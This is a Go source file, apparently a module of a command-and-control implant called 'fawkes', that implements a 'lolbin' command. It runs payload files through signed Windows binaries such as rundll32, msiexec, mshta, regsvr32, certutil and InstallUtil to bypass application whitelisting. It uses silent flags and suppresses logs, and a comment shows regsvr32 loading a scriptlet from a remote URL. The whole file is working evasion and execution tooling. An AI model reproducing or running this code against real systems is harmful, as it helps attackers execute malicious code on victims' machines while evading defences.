//go:build windows
// +build windows

package commands

import (
	"context"
	"encoding/json"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"

	"fawkes/pkg/structs"
)

// lolbinTimeout is the maximum time a LOLBin process can run before being killed
const lolbinTimeout = 60 * time.Second

type LolbinCommand struct{}

func (c *LolbinCommand) Name() string {
	return "lolbin"
}

func (c *LolbinCommand) Description() string {
	return "Signed binary proxy execution — execute payloads through legitimate Windows binaries to bypass application whitelisting"
}

type lolbinArgs struct {
	Action string `json:"action"`
	Path   string `json:"path"`
	Export string `json:"export"`
	Args   string `json:"args"`
}

func (c *LolbinCommand) Execute(task structs.Task) structs.CommandResult {
	var args lolbinArgs
	if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
		return errorf("Error parsing parameters: %v", err)
	}

	if args.Action == "" {
		return errorResult("Error: action is required (rundll32, msiexec, regsvcs, regasm, mshta, certutil, regsvr32, installutil)")
	}
	if args.Path == "" {
		return errorResult("Error: path to payload file is required")
	}

	// Verify payload exists
	absPath, err := filepath.Abs(args.Path)
	if err != nil {
		return errorf("Error resolving path: %v", err)
	}
	if _, err := os.Stat(absPath); err != nil {
		return errorf("Error: payload file not found: %v", err)
	}

	switch args.Action {
	case "rundll32":
		return lolbinRundll32(absPath, args.Export, args.Args)
	case "msiexec":
		return lolbinMsiexec(absPath, args.Args)
	case "regsvcs":
		return lolbinRegsvcs(absPath, args.Args)
	case "regasm":
		return lolbinRegasm(absPath, args.Args)
	case "mshta":
		return lolbinMshta(absPath, args.Args)
	case "certutil":
		return lolbinCertutil(absPath, args.Args)
	case "regsvr32":
		return lolbinRegsvr32(absPath, args.Args)
	case "installutil":
		return lolbinInstallUtil(absPath, args.Args)
	case "vbs":
		return lolbinVBS(absPath, args.Args)
	case "lua":
		return lolbinLua(absPath, args.Args)
	default:
		return errorf("Unknown action: %s (use rundll32, msiexec, regsvcs, regasm, mshta, certutil, regsvr32, installutil, vbs, lua)", args.Action)
	}
}

// rundll32 — T1218.011 — Execute DLL exports via rundll32.exe
func lolbinRundll32(dllPath, export, extraArgs string) structs.CommandResult {
	if export == "" {
		export = "DllMain"
	}

	// rundll32.exe <dll_path>,<export_function> [args]
	cmdArgs := fmt.Sprintf("%s,%s", dllPath, export)
	if extraArgs != "" {
		cmdArgs += " " + extraArgs
	}

	ctx, cancel := context.WithTimeout(context.Background(), lolbinTimeout)
	defer cancel()

	cmd := exec.CommandContext(ctx, "rundll32.exe", cmdArgs)
	output, err := cmd.CombinedOutput()

	result := fmt.Sprintf("[+] rundll32.exe %s\n", cmdArgs)
	if len(output) > 0 {
		result += string(output)
	}
	if ctx.Err() == context.DeadlineExceeded {
		result += "\n[!] Process killed after timeout"
	} else if err != nil {
		// rundll32 often returns non-zero even on success
		result += fmt.Sprintf("\nProcess exited: %v", err)
	}

	return successResult(result)
}

// msiexec — T1218.007 — Execute via MSI package
func lolbinMsiexec(msiPath, extraArgs string) structs.CommandResult {
	// msiexec /i <msi_path> /qn (quiet, no UI)
	cmdArgs := []string{"/i", msiPath, "/qn"}
	if extraArgs != "" {
		cmdArgs = append(cmdArgs, strings.Fields(extraArgs)...)
	}

	ctx, cancel := context.WithTimeout(context.Background(), lolbinTimeout)
	defer cancel()

	cmd := exec.CommandContext(ctx, "msiexec.exe", cmdArgs...)
	output, err := cmd.CombinedOutput()

	result := fmt.Sprintf("[+] msiexec.exe %s\n", strings.Join(cmdArgs, " "))
	if len(output) > 0 {
		result += string(output)
	}
	if ctx.Err() == context.DeadlineExceeded {
		result += "\n[!] Process killed after timeout"
	} else if err != nil {
		result += fmt.Sprintf("\nProcess exited: %v", err)
	}

	return successResult(result)
}

// regsvcs — T1218.009 — .NET COM registration via regsvcs.exe
func lolbinRegsvcs(dllPath, extraArgs string) structs.CommandResult {
	cmdArgs := []string{dllPath}
	if extraArgs != "" {
		cmdArgs = append(cmdArgs, strings.Fields(extraArgs)...)
	}

	regsvcsPath := findDotNetTool("RegSvcs.exe")
	if regsvcsPath == "" {
		return errorResult("Error: RegSvcs.exe not found in .NET Framework directories")
	}

	ctx, cancel := context.WithTimeout(context.Background(), lolbinTimeout)
	defer cancel()

	cmd := exec.CommandContext(ctx, regsvcsPath, cmdArgs...)
	output, err := cmd.CombinedOutput()

	result := fmt.Sprintf("[+] %s %s\n", regsvcsPath, strings.Join(cmdArgs, " "))
	if len(output) > 0 {
		result += string(output)
	}
	if ctx.Err() == context.DeadlineExceeded {
		result += "\n[!] Process killed after timeout"
	} else if err != nil {
		result += fmt.Sprintf("\nProcess exited: %v", err)
	}

	return successResult(result)
}

// regasm — T1218.009 — .NET assembly registration via regasm.exe
func lolbinRegasm(dllPath, extraArgs string) structs.CommandResult {
	cmdArgs := []string{dllPath}
	if extraArgs != "" {
		cmdArgs = append(cmdArgs, strings.Fields(extraArgs)...)
	}

	regasmPath := findDotNetTool("RegAsm.exe")
	if regasmPath == "" {
		return errorResult("Error: RegAsm.exe not found in .NET Framework directories")
	}

	ctx, cancel := context.WithTimeout(context.Background(), lolbinTimeout)
	defer cancel()

	cmd := exec.CommandContext(ctx, regasmPath, cmdArgs...)
	output, err := cmd.CombinedOutput()

	result := fmt.Sprintf("[+] %s %s\n", regasmPath, strings.Join(cmdArgs, " "))
	if len(output) > 0 {
		result += string(output)
	}
	if ctx.Err() == context.DeadlineExceeded {
		result += "\n[!] Process killed after timeout"
	} else if err != nil {
		result += fmt.Sprintf("\nProcess exited: %v", err)
	}

	return successResult(result)
}

// mshta — T1218.005 — Execute HTA/JS via mshta.exe
func lolbinMshta(htaPath, extraArgs string) structs.CommandResult {
	cmdArgs := []string{htaPath}
	if extraArgs != "" {
		cmdArgs = append(cmdArgs, strings.Fields(extraArgs)...)
	}

	ctx, cancel := context.WithTimeout(context.Background(), lolbinTimeout)
	defer cancel()

	cmd := exec.CommandContext(ctx, "mshta.exe", cmdArgs...)
	output, err := cmd.CombinedOutput()

	result := fmt.Sprintf("[+] mshta.exe %s\n", strings.Join(cmdArgs, " "))
	if len(output) > 0 {
		result += string(output)
	}
	if ctx.Err() == context.DeadlineExceeded {
		result += "\n[!] Process killed after timeout"
	} else if err != nil {
		result += fmt.Sprintf("\nProcess exited: %v", err)
	}

	return successResult(result)
}

// certutil — T1218 — Decode/download via certutil.exe
func lolbinCertutil(filePath, extraArgs string) structs.CommandResult {
	outPath := strings.TrimSuffix(filePath, filepath.Ext(filePath)) + ".decoded"
	cmdArgs := []string{"-decode", filePath, outPath}
	if extraArgs != "" {
		cmdArgs = strings.Fields(extraArgs)
	}

	ctx, cancel := context.WithTimeout(context.Background(), lolbinTimeout)
	defer cancel()

	cmd := exec.CommandContext(ctx, "certutil.exe", cmdArgs...)
	output, err := cmd.CombinedOutput()

	result := fmt.Sprintf("[+] certutil.exe %s\n", strings.Join(cmdArgs, " "))
	if len(output) > 0 {
		result += string(output)
	}
	if ctx.Err() == context.DeadlineExceeded {
		result += "\n[!] Process killed after timeout"
	} else if err != nil {
		result += fmt.Sprintf("\nProcess exited: %v", err)
	}

	return successResult(result)
}

// regsvr32 — T1218.010 — Execute DLL/scriptlet via regsvr32.exe
// Regsvr32 is a signed Microsoft binary that can execute:
// - DLLs via DllRegisterServer export: regsvr32.exe payload.dll
// - COM scriptlets via /i: regsvr32.exe /s /n /u /i:http://... scrobj.dll
func lolbinRegsvr32(payloadPath, extraArgs string) structs.CommandResult {
	var cmdArgs []string

	if extraArgs != "" {
		// Custom args mode — operator controls the full command line
		cmdArgs = strings.Fields(extraArgs)
		// Ensure payload path is included
		found := false
		for _, a := range cmdArgs {
			if strings.Contains(a, payloadPath) {
				found = true
				break
			}
		}
		if !found {
			cmdArgs = append(cmdArgs, payloadPath)
		}
	} else {
		// Default: silent DLL registration (executes DllRegisterServer export)
		cmdArgs = []string{"/s", payloadPath}
	}

	ctx, cancel := context.WithTimeout(context.Background(), lolbinTimeout)
	defer cancel()

	cmd := exec.CommandContext(ctx, "regsvr32.exe", cmdArgs...)
	output, err := cmd.CombinedOutput()

	result := fmt.Sprintf("[+] regsvr32.exe %s\n", strings.Join(cmdArgs, " "))
	if len(output) > 0 {
		result += string(output)
	}
	if ctx.Err() == context.DeadlineExceeded {
		result += "\n[!] Process killed after timeout"
	} else if err != nil {
		result += fmt.Sprintf("\nProcess exited: %v", err)
	}

	return successResult(result)
}

// installutil — T1218.004 — Execute .NET assembly via InstallUtil.exe
// InstallUtil is a .NET Framework tool that loads assemblies and runs
// the Installer class. Malicious assemblies can execute code in the
// Install/Uninstall methods.
func lolbinInstallUtil(assemblyPath, extraArgs string) structs.CommandResult {
	installUtilPath := findDotNetTool("InstallUtil.exe")
	if installUtilPath == "" {
		return errorResult("Error: InstallUtil.exe not found in .NET Framework directories")
	}

	// Default: /logfile= /LogToConsole=false to suppress output files
	cmdArgs := []string{"/logfile=", "/LogToConsole=false"}
	if extraArgs != "" {
		cmdArgs = append(cmdArgs, strings.Fields(extraArgs)...)
	}
	cmdArgs = append(cmdArgs, assemblyPath)

	ctx, cancel := context.WithTimeout(context.Background(), lolbinTimeout)
	defer cancel()

	cmd := exec.CommandContext(ctx, installUtilPath, cmdArgs...)
	output, err := cmd.CombinedOutput()

	result := fmt.Sprintf("[+] %s %s\n", installUtilPath, strings.Join(cmdArgs, " "))
	if len(output) > 0 {
		result += string(output)
	}
	if ctx.Err() == context.DeadlineExceeded {
		result += "\n[!] Process killed after timeout"
	} else if err != nil {
		result += fmt.Sprintf("\nProcess exited: %v", err)
	}

	return successResult(result)
}

// vbs — T1059.005 — Execute VBScript via cscript.exe or wscript.exe
func lolbinVBS(scriptPath, extraArgs string) structs.CommandResult {
	// Try cscript first (console output), fall back to wscript (GUI)
	interpreter := "cscript.exe"
	if _, err := exec.LookPath(interpreter); err != nil {
		interpreter = "wscript.exe"
	}

	cmdArgs := []string{"//Nologo", scriptPath}
	if extraArgs != "" {
		cmdArgs = append(cmdArgs, strings.Fields(extraArgs)...)
	}

	ctx, cancel := context.WithTimeout(context.Background(), lolbinTimeout)
	defer cancel()

	cmd := exec.CommandContext(ctx, interpreter, cmdArgs...)
	output, err := cmd.CombinedOutput()

	result := fmt.Sprintf("[+] VBScript execution via %s\n    Script: %s\n", interpreter, scriptPath)
	if len(output) > 0 {
		result += string(output)
	}
	if ctx.Err() == context.DeadlineExceeded {
		result += "\n[!] Process killed after timeout"
	} else if err != nil {
		result += fmt.Sprintf("\nProcess exited: %v", err)
	}

	return successResult(result)
}

// lua — T1059 — Execute Lua script via lua interpreter
func lolbinLua(scriptPath, extraArgs string) structs.CommandResult {
	// Search for Lua interpreters
	var interpreter string
	for _, name := range []string{"lua", "lua5.4", "lua5.3", "lua5.1", "luajit"} {
		if p, err := exec.LookPath(name); err == nil {
			interpreter = p
			break
		}
	}
	if interpreter == "" {
		return errorResult("Error: no Lua interpreter found (lua, lua5.4, lua5.3, lua5.1, luajit)")
	}

	cmdArgs := []string{scriptPath}
	if extraArgs != "" {
		cmdArgs = append(cmdArgs, strings.Fields(extraArgs)...)
	}

	ctx, cancel := context.WithTimeout(context.Background(), lolbinTimeout)
	defer cancel()

	cmd := exec.CommandContext(ctx, interpreter, cmdArgs...)
	output, err := cmd.CombinedOutput()

	result := fmt.Sprintf("[+] Lua execution via %s\n    Script: %s\n", interpreter, scriptPath)
	if len(output) > 0 {
		result += string(output)
	}
	if ctx.Err() == context.DeadlineExceeded {
		result += "\n[!] Process killed after timeout"
	} else if err != nil {
		result += fmt.Sprintf("\nProcess exited: %v", err)
	}

	return successResult(result)
}

// findDotNetTool searches for .NET Framework tools in standard locations
func findDotNetTool(toolName string) string {
	frameworkDir := `C:\Windows\Microsoft.NET\Framework64`
	entries, err := os.ReadDir(frameworkDir)
	if err != nil {
		// Try 32-bit framework
		frameworkDir = `C:\Windows\Microsoft.NET\Framework`
		entries, err = os.ReadDir(frameworkDir)
		if err != nil {
			return ""
		}
	}

	// Search in reverse order (newest version first)
	for i := len(entries) - 1; i >= 0; i-- {
		if !entries[i].IsDir() {
			continue
		}
		toolPath := filepath.Join(frameworkDir, entries[i].Name(), toolName)
		if _, err := os.Stat(toolPath); err == nil {
			return toolPath
		}
	}
	return ""
}
